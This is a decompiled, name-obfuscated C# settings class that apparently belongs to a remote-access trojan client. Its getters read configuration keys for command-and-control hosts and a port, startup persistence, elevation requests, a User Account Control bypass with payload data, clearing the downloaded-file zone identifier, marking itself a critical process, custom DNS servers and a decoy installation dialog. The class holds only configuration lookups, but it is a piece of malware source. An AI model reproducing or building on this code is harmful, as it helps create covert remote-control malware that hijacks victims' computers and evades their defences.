using System;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class15
{
	public static Guid guid_0;

	public static DateTime dateTime_0;

	public static bool bool_0;

	public static bool bool_1;

	public static string string_0;

	public static string string_1;

	public static string string_2;

	public static string string_3;

	public static IntPtr intptr_0;

	public static DateTime smethod_0()
	{
		return (DateTime)smethod_35("BuildTime", DateTime.UtcNow);
	}

	public static Version smethod_1()
	{
		return (Version)smethod_35("Version", new Version(0, 0, 0, 0));
	}

	public static Guid smethod_2()
	{
		return (Guid)smethod_35("Mutex", Guid.Empty);
	}

	public static string smethod_3()
	{
		return (string)smethod_35("DefaultGroup", "Default");
	}

	public static string smethod_4()
	{
		return (string)smethod_35("PrimaryConnectionHost", "127.0.0.1");
	}

	public static string smethod_5()
	{
		return (string)smethod_35("BackupConnectionHost", string.Empty);
	}

	public static ushort smethod_6()
	{
		return (ushort)smethod_35("ConnectionPort", (ushort)9033);
	}

	public static bool smethod_7()
	{
		return (bool)smethod_35("RunOnStartup", false);
	}

	public static bool smethod_8()
	{
		return (bool)smethod_35("RequestElevation", false);
	}

	public static bool smethod_9()
	{
		return (bool)smethod_35("BypassUserAccountControl", false);
	}

	public static byte[] smethod_10()
	{
		return (byte[])smethod_35("BypassUserAccountControlData", null);
	}

	public static bool smethod_11()
	{
		return (bool)smethod_35("ClearZoneIdentifier", true);
	}

	public static bool smethod_12()
	{
		return (bool)smethod_35("ClearAccessControl", false);
	}

	public static bool smethod_13()
	{
		return (bool)smethod_35("SetCriticalProcess", false);
	}

	public static bool smethod_14()
	{
		return (bool)smethod_35("PreventSystemSleep", true);
	}

	public static bool smethod_15()
	{
		return (bool)smethod_35("ActivateAwayMode", false);
	}

	public static bool smethod_16()
	{
		return (bool)smethod_35("EnableDebugMode", false);
	}

	public static int smethod_17()
	{
		return (int)smethod_35("RunDelay", 0);
	}

	public static int smethod_18()
	{
		return (int)smethod_35("ConnectDelay", 4000);
	}

	public static int smethod_19()
	{
		return (int)smethod_35("RestartDelay", 5000);
	}

	public static int smethod_20()
	{
		return (int)smethod_35("TimeoutInterval", 5000);
	}

	public static int smethod_21()
	{
		return (int)smethod_35("KeepAliveTimeout", 30000);
	}

	public static int smethod_22()
	{
		return (int)smethod_35("MutexTimeout", 2500);
	}

	public static int smethod_23()
	{
		return (int)smethod_35("LanTimeout", 2500);
	}

	public static int smethod_24()
	{
		return (int)smethod_35("WanTimeout", 8000);
	}

	public static int smethod_25()
	{
		return (int)smethod_35("BufferSize", 65535);
	}

	public static int smethod_26()
	{
		return (int)smethod_35("MaxPacketSize", 10485760);
	}

	public static int smethod_27()
	{
		return (int)smethod_35("GCThreshold", 10485760);
	}

	public static bool smethod_28()
	{
		return (bool)smethod_35("UseCustomDnsServer", false);
	}

	public static string smethod_29()
	{
		return (string)smethod_35("PrimaryDnsServer", string.Empty);
	}

	public static string smethod_30()
	{
		return (string)smethod_35("BackupDnsServer", string.Empty);
	}

	public static bool smethod_31()
	{
		return (bool)smethod_35("ShowInstallationDialog", false);
	}

	public static string smethod_32()
	{
		return (string)smethod_35("InstallationDialogTitle", string.Empty);
	}

	public static string smethod_33()
	{
		return (string)smethod_35("InstallationDialogMessage", string.Empty);
	}

	public static byte smethod_34()
	{
		return (byte)smethod_35("InstallationDialogIcon", (byte)0);
	}

	public static object smethod_35(string string_4, object object_0)
	{
		if (Class8.dictionary_1.ContainsKey(string_4))
		{
			return Class8.dictionary_1[string_4];
		}
		return object_0;
	}
}
